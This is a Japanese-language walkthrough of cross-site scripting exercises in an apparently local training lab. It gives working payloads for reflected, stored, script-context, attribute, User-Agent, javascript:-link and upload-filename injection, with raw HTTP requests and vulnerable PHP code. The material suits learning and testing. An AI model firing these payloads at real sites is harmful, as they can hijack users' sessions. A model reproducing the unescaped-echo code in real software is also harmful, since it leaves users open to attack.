# Cross Site Scripting (XSS)
It allows client-side code to be injected into web pages viewed by other users.

## Basic Reflected
入力フォームに`<img src=# onerror=alert(1)>`などを入れてSubmitすれば発火する。
```http
GET /lab/xss/basic-reflected/index.php?q=%3Cimg+src%3D%23+onerror%3Dalert%281%29%3E HTTP/1.1
Host: 127.0.0.1:1337
Referer: http://127.0.0.1:1337/lab/xss/basic-reflected/index.php
Cookie: PHPSESSID=jcq93cbuj03f4jm7heim20rdd9; lang=en
Connection: close

```
```html
<body>
  <div class="container d-flex justify-content-center align-items-center h-100 mx-auto">
    <div class="alert alert-danger" style="margin-top: 30vh;" role="alert" >
    No Result Found for <b><img src=# onerror=alert(1)></b> <a href="index.php" ">Try Again</a></div>
    </div>
  <script id="VLBar" title="Basic Reflected" category-id="1" src="/public/assets/js/vlnav.min.js"></script>
</body>
```

## Basic Stored
入力フォームに`<svg onload=alert(1)>`などを入れて投稿すると保存され、以降アクセスするたびに発火する。
```http
POST /lab/xss/basic-stored/stored.php HTTP/1.1
Host: 127.0.0.1:1337
Content-Length: 43
Content-Type: application/x-www-form-urlencoded
Referer: http://127.0.0.1:1337/lab/xss/basic-stored/stored.php
Cookie: PHPSESSID=jcq93cbuj03f4jm7heim20rdd9; lang=en
Connection: close

mes=hogehoge%3Csvg+onload%3Dalert%281%29%3E
```
```html
<div class="msg col-md-6 m-3 px-4 bg-primary text-wrap " style="border-radius: 20px; padding: 5px;width: fit-content;color: aliceblue;">
  hogehoge<svg onload=alert(1)>
</div>
```

## Basic Dom-Based
数字を入力すると乗算をした結果を返す。
```php
        echo '<script>';
        echo 'var height = '.$_GET['height'].';';
        echo 'var base = '.$_GET['base'].';';
        echo 'var ans = base * height / 2;';
        echo 'document.getElementById("answer").innerHTML = "'.$strings['alert'].' "+ans;';
        echo '</script>';
```

適当に`hogehoge`,`fugafuga`と入力した状態のDOMは以下の通り。
```html
<script>
  var height = hogehoge;
  var base = fugafuga;
  var ans = base * height / 2;
  document.getElementById("answer").innerHTML = "Area: "+ans;
</script>
```
JavaScriptの構文を合わせてあげればよい。  
hogehoge`の代わりに`777;alert(document.cookie)`などを入力すれば発火する。
```html
<script>
  var height = 777;alert(document.cookie);
  var base = 100;
  var ans = base * height / 2;document.getElementById("answer").innerHTML = "Area: "+ans;
</script>
```

ただ、これはJavaScript内へのReflected XSSの気がするため、想定解なのか不明。

## HTML Attribute Manipulation
入力欄に適当に`hoge`と入れてレスポンスを確認する。
```html
<div class="ticket alert alert-primary" style="max-width: 50vw;">
  <h6>
    <a href="ticket.php?name=hoge"> SEE YOUR TICKET </a>
  </h6>
</div>
```

入力したhogeがhref要素に入り、リンク先の一部として扱われていることが分かる。
`"`を一度閉じればイベントハンドラを追加できるので、`hoge" onmouseover="alert(1)`などとする。
```html
<div class="ticket alert alert-primary" style="max-width: 50vw;">
  <h6>
    <a href="ticket.php?name=hoge" onmouseover="alert(1)"> SEE YOUR TICKET </a>
  </h6>
</div>
```

## Welcome to Our Gallery
imageボタンを押すと数字だけのパラメータが飛び、後ろに`.jpg`が付いた結果が返ってくる。  
`img=1`の場合、以下の通り。
```html
<img class="shadow-lg bg-body rounded" style="width:500px;padding : 0; margin-bottom: 0;" src="1.jpg"/>
```

構文を壊さずにimgタグに対してイベントハンドラを埋め込めばよい。

クエリパラメータ`?img=x"onerror="alert(1)//`の場合、対象の画像なしで即時発火。
```html
<img class="shadow-lg bg-body rounded" style="width:500px;padding : 0; margin-bottom: 0;" src="x"onerror="alert(1)//.jpg"/>
```

`.jpg`を付けて存在するファイル名にしてあげる場合`?img=1.jpg"onmouseover="alert(1)//`のように書ける。
```html
<img class="shadow-lg bg-body rounded" style="width:500px;padding : 0; margin-bottom: 0;" src="1.jpg"onmouseover="alert(1)//.jpg"/>
```

## User Agent
mandalorianユーザでログインするとアクセス履歴のようなものを見させられる。  
使用しているブラウザのUser-Agentがそのまま画面に表れていることが分かる。

Click Hereボタン押下時のUser-Agentをスクリプトに書き換えれば発火する。
```http
POST /lab/xss/user-agent/user_agent_stored.php HTTP/1.1
Host: 127.0.0.1:1337
Content-Length: 2
Cache-Control: max-age=0
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0<script>alert(1)</script>
Cookie: PHPSESSID=jcq93cbuj03f4jm7heim20rdd9; lang=en
Connection: close

a=
```

## News
ニュースのタイトルとURLを登録するとリンクを張ってくれる。  
URLをhttpでなくJavaScriptスキーマで書くと、リンク押下時に発火させることができる。
```http
POST /lab/xss/news/ HTTP/1.1
Host: 127.0.0.1:1337
Content-Length: 45
Content-Type: application/x-www-form-urlencoded
Cookie: PHPSESSID=jcq93cbuj03f4jm7heim20rdd9; lang=en
Connection: close

title=hogehoge&link=javascript%3Aalert%281%29
```
```html
<tr>
  <th>3</th>
  <td><a href="javascript:alert(1)"style="text-decoration: none;">hogehoge</a></td>
```

なお、`"`は無害化されてしまうため、イベントハンドラを入れるのは無理そう。

## File Upload
画像ファイルをアップロードできる。
```http
POST /lab/xss/image-upload/index.php HTTP/1.1
Host: localhost:1337
Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryGGBjpOPOUAqCkMJm
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9


------WebKitFormBoundaryGGBjpOPOUAqCkMJm
Content-Disposition: form-data; name="image"; filename="1x1.png"
Content-Type: image/png

�PNG
------WebKitFormBoundaryGGBjpOPOUAqCkMJm
Content-Disposition: form-data; name="submit"

Upload
------WebKitFormBoundaryGGBjpOPOUAqCkMJm--
```

レスポンスにはこんな感じで
```html
<div class="container-wrapper">
<div class="row pt-5 mt-5 mb-3 d-flex justify-content-center">
<div class="row col-md-4 text-center d-flex justify-content-center shadow-lg p-3 mb-5 rounded">
<img src="uploads/1x1.png                            " style="width: 300px;margin-top: 8px;" class="rounded-circle" alt="" srcset="">
<form action="#" method="post" enctype="multipart/form-data">
 ```
 
 半角スペースが入っている意味は不明だが、ファイル名が`<img src="upload/"`の後ろに出ていることが分かる。

ダブルクォーテーションで閉じることができるか試してみる。
```http
POST /lab/xss/image-upload/index.php HTTP/1.1
Host: localhost:1337
Content-Length: 312
Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryZ2hDGxPdrsacLlEu
Connection: close

------WebKitFormBoundaryZ2hDGxPdrsacLlEu
Content-Disposition: form-data; name="image"; filename="\"onerror=\"alert(1)\".gif"
Content-Type: image/gif

GIF87aaaaaaaa
------WebKitFormBoundaryZ2hDGxPdrsacLlEu
Content-Disposition: form-data; name="submit"

Upload
------WebKitFormBoundaryZ2hDGxPdrsacLlEu--
```

レスポンスで、src属性から外にイベントハンドラが追加されており、XSSが動作する。
```html
<div class="container-wrapper">
<div class="row pt-5 mt-5 mb-3 d-flex justify-content-center">
<div class="row col-md-4 text-center d-flex justify-content-center shadow-lg p-3 mb-5 rounded">
<img src="uploads/"onerror="alert(1)".gif                            " style="width: 300px;margin-top: 8px;" class="rounded-circle" alt="" srcset="">
<form action="#" method="post" enctype="multipart/form-data">
<div class="">
```






